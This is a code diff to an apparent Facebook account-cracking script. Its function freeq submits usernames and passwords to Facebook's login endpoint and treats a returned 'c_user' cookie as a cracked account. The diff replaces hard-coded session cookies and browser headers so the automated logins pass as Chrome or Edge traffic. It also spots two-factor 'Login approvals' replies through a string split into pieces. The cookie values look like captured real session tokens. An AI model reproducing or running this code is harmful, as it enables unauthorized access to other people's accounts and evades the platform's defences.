@@ -1634,27 +1634,26 @@ def freeq(uid,pwx,tl):
             'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVqq^%^2FV^%^2FAAAAAFAC',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'sb': '5E1pZyIkrazTl9Lj5yv8FN4P',
-            'ps_l': '1',
             'ps_n': '1',
-            'datr': '45hpZ84LBzmpGwmbE9JN9ZXc',
-            'locale': 'hi_IN',
-            'sfau': 'AYi348_Q4gD0LWqAX5vW33WJeeLyB7ZB6tlRS9473TekiCjw3Y8xp3yU7CCqoS5MG8um8sMmqGytuGRxKjqYqEyNxmtQVLVYCuVO2nuHwzG6494SpQZiVzaQIkjRQPMLOqhxn2Qjxk288PZWqpD6AjKprBrnNtpa-HR_qpmFtI-O7OW-wCcDnWJSuqXEGpSxGw_YXeuJviszqCNj2FQLuHpH8uRRrS11qPntJ_ci4xU7Rb7IrVyRr0xq3xYcFtHmnaM8H8RyHR45ZALY01lypjTK',
-            'sfiu': 'AYhXC7nly3JHF8E4cNbxE8HpfXa_z6BgY3fohNOdvCYuSLuzVDjkOnMYpOmQq0kHqx4VRpjSOiOEGtrMi3BhmCPXw0F2EMGw2qBWVap_3QC-lGtWUkmwJsMrN-i7RThvtl09JvU6T_AiOnC54ThK1xptl38taxVKLSO147CNZjZeyTRffDuF3GE5g5znei5QtynAOeELCnimqHzJ8KqMgNM1nTx-nIll3zRsL1Nmo65U67_WHWEHNPdKwRutG9kEduS3uqo0ROnRfshzGthlONhs',
-            'fr': '1DOT6cE76vJRVkxeO.AWUO1jQu4hUzg05x2PuuWiLY9Ek.BnaZjr..AAA.0.0.BncD_Y.AWVrzwXp7Ok',
-            'wd': '876x773',}
+            'ps_l': '1',
+            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
+            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
+            'locale': 'en_GB',
+            'wd': '1440x828',
+            'fr': '1rNHx4L9yZvgxejws.AWVG7gNsQCdCSTirPwiJlFhmn-c.BnXFu6..AAA.0.0.BncEPd.AWXyFjdGZE0',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://www.facebook.com',
+            'origin': 'https://hi-in.facebook.com',
+            'pragma': 'no-cache',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'referer': 'https://hi-in.facebook.com/?ref=homescreenpwa',
             'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.205", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
@@ -1664,10 +1663,10 @@ def freeq(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'viewport-width': '876',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+            'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
